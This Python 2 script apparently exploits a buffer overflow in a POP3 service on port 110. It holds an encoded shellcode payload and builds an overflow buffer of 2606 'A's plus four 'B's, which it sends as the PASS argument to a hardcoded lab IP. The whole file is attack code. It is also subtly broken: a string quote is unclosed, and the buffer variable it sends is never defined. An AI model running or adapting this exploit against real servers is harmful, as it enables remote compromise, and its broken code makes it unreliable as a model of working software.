#!/usr/bin/python
import socket, sys
from time import sleep

#ArrayOfAllHexChars
shellcode=("\xda\xdc\xba\xc8\x40\x1f\x91\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x9e\x53\xfd\x64\xe2\xbc\x83"
"\x87\x1a\x3d\xe4\x0e\xff\x0c\x24\x74\x74\x3e\x94\xfe\xd8\xb3"
"\x5f\x52\xc8\x40\x2d\x7b\xff\xe1\x98\x5d\xce\xf2\xb1\x9e\x51"
"\x71\xc8\xf2\xb1\x48\x03\x07\xb0\x8d\x7e\xea\xe0\x46\xf4\x59"
"\x14\xe2\x40\x62\x9f\xb8\x45\xe2\x7c\x08\x67\xc3\xd3\x02\x3e"
"\xc3\xd2\xc7\x4a\x4a\xcc\x04\x76\x04\x67\xfe\x0c\x97\xa1\xce"
"\xed\x34\x8c\xfe\x1f\x44\xc9\x39\xc0\x33\x23\x3a\x7d\x44\xf0"
"\x40\x59\xc1\xe2\xe3\x2a\x71\xce\x12\xfe\xe4\x85\x19\x4b\x62"
"\xc1\x3d\x4a\xa7\x7a\x39\xc7\x46\xac\xcb\x93\x6c\x68\x97\x40"
"\x0c\x29\x7d\x26\x31\x29\xde\x97\x97\x22\xf3\xcc\xa5\x69\x9c"
"\x21\x84\x91\x5c\x2e\x9f\xe2\x6e\xf1\x0b\x6c\xc3\x7a\x92\x6b"
"\x24\x51\x62\xe3\xdb\x5a\x93\x2a\x18\x0e\xc3\x44\x89\x2f\x88"
"\x94\x36\xfa\x1f\xc4\x98\x55\xe0\xb4\x58\x06\x88\xde\x56\x79"
"\xa8\xe1\xbc\x12\x43\x18\x57\x17\x9f\x22\xd8\x4f\x9d\x22\x37"
"\xcc\x28\xc4\x5d\xfc\x7c\x5f\xca\x65\x25\x2b\x6b\x69\xf3\x56"
"\xab\xe1\xf0\xa7\x62\x02\x7c\xbb\x13\xe2\xcb\xe1\xb2\xfd\xe1"
"\x8d\x59\x6f\x6e\x4d\x17\x8c\x39\x1a\x70\x62\x30\xce\x6c\xdd"
"\xea\xec\x6c\xbb\xd5\xb4\xaa\x78\xdb\x35\x3e\xc4\xff\x25\x86"
"\xc5\xbb\x11\x56\x90\x15\xcf\x10\x4a\xd4\xb9\xca\x21\xbe\x2d"
"\x8a\x09\x01\x2b\x93\x47\xf7\xd3\x22\x3e\x4e\xec\x8b\xd6\x46"
"\x95\xf1\x46\xa8\x4c\xb2\x77\xe3\xcc\x93\x1f\xaa\x85\xa1\x7d"
"\x4d\x70\xe5\x7b\xce\x70\x96\x7f\xce\xf1\x93\xc4\x48\xea\xe9"
"\x55\x3d\x0c\x5d\x55\x14)

Org_Buffer="A"*2606+"B"*4

#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")
	
UN='username'
target='10.11.20.153'
Tport=110

try:	
	print "Sending Offset of size %s"% str(len(BufferOfAllHexCharsToLookForBadOnes))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect((target,Tport))
	s.recv(1024)
	#command to send with param we are trying to overflow
	s.send('USER '+UN+'\r\n')
	s.recv(1024)
	s.send('PASS '+BufferOfAllHexCharsToLookForBadOnes+'\r\n')
	s.send('QUIT')	
	s.close()
	sleep(1)
		
except:
	print "Buffer Sent..Crashed?"
	sys.exit()

print "[*] Complete.."
